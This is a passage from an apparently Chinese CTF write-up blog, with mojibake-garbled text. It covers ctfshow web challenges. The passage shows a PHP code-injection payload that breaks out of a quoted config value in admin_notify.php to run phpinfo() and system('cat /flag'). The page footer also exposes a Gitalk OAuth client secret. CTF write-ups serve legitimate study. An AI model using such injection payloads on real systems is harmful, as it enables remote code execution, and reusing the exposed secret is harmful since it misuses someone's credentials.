* æœ€å¤šæ”¯æŒå‘å¸ƒ3æ¡ä¼šå‘˜é€šçŸ¥ï¼Œåˆ é™¤é€šçŸ¥å†…å®¹å³å¯å–æ¶ˆå‘å¸ƒè¯¥æ¡ã€‚
&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td width=&quot;90%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
* å¦‚æœä¿®æ”¹æ— æ•ˆï¼Œè¯·æ£€æŸ¥/data/admin/notify.phpæ–‡ä»¶æƒé™æ˜¯å¦å¯å†™ã€‚
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;	
	

&lt;/form&gt;
&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;
&lt;?php 
viewFoot();
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>è¿™é‡Œå¯ä»¥æ§åˆ¶å†™å…¥phpæ–‡ä»¶çš„å†…å®¹ğŸ™‚ï¼Œåªéœ€è¦æ³¨æ„é—­åˆä¸€ä¸‹å¼•å·<br>
è®¿é—®/admin/admin_notify.php<br>
<img src="https://fallingskies22.github.io/post-images/1722671593542.png" alt="" loading="lazy"></p>
<p>åœ¨notify3å¤„å†™payload</p>
<pre><code>123&quot;;phpinfo();$notify=&quot;
</code></pre>
<p>æäº¤å³å¯å‘ç°phpinfo</p>
<p><img src="https://fallingskies22.github.io/post-images/1722671793849.png" alt="" loading="lazy"><br>
è¿™ä¸ªphpinfoé‡Œçš„flagä¸å¯¹ï¼ŒçœŸflagåœ¨æ ¹ç›®å½•ã€‚ğŸ¤¡</p>
<pre><code>123&quot;;system('cat /flag');$notify=&quot;
</code></pre>
<h2 id="web485-2">web485</h2>
<p>DSCMS(20210531)</p>
<p>æ‰¾ä¸åˆ°å…·ä½“ç‰ˆæœ¬ã€‚ã€‚ã€‚<br>
ç”¨æˆ·ç™»å½•å¤„éªŒè¯ç ä¹Ÿæ²¡æœ‰ï¼Œæ³¨å†Œä¹Ÿä¸è¡Œã€‚ğŸ˜µ<br>
æ‰¾äº†ä¸€åœˆå…¬å¼€cveä¹Ÿæ²¡æœ‰ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯åå°æ¼æ´ã€‚ã€‚ã€‚</p>

            </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://fallingskies22.github.io/post/ctfshowkuang-jia-fu-xian/">
                  <h3 class="post-title">
                    [ctfshow]æ¡†æ¶å¤ç°
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: '1b08861b8ad19018640e',
        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
        repo: 'fallingskies22.github.io',
        owner: 'fallingskies22',
        admin: ['fallingskies22'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
